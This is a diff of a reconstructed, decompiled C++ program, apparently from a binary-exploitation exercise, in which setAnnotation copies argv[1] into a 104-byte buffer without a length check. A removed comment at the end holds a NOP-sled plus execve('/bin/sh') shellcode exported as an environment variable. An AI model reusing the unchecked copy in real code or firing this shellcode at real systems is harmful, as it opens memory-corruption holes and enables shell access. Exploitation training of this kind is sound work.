@@ -1,35 +1,29 @@
 #include <iostream>
+#include <cstring>
+#include <cstdlib>
 
 class N
 {
   public:
-    N(N *,int);
+    char str[104];
+    int nbr;
+    N(int nbr);
+    void setAnnotation(N * obj, char *str);
 };
 
-N::N(N *this,int param_1)
+N::N(int nbr)
 {
-  *(undefined ***)this = &PTR_operator+_08048848;
-  *(int *)(this + 104) = param_1;
+  *(int *)(this + 104) = nbr;
   return;
 }
 
-int     N::operator+(N *obj)
+void    N::setAnnotation(N * obj, char *str)
 {
-  return *(int *)(obj + 104) + *(int *)(this + 104);
-}
-
-int     N::operator-(N *obj)
-{
-  return *(int *)(this + 104) - *(int *)(obj + 104);
-}
-
-void    N::setAnnotation(N *this, char *str)
-{
-  memcpy(this + 4, str, strlen(str));
+  memcpy(obj, str, strlen(str));
   return;
 }
 
-int   main(int argc, char *argv)
+int   main(int argc, char *argv[])
 {
     N *obj1;
     N *obj2;
@@ -37,15 +31,8 @@ int   main(int argc, char *argv)
     if (argc < 2) {
       exit(1);
     }
-    // obj1 = (N *)new(108);
-    obj1 = new N();
-    N::N(5);
-    obj2 = new N();
-    N::N(6);
+    obj1 = new N(5);
+    obj2 = new N(6);
     obj2->setAnnotation(obj1, argv[1]);
-    
     return (0);
 }
-
-
-// export SHELLCODE=$(python -c 'print "\x90"*400 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"')
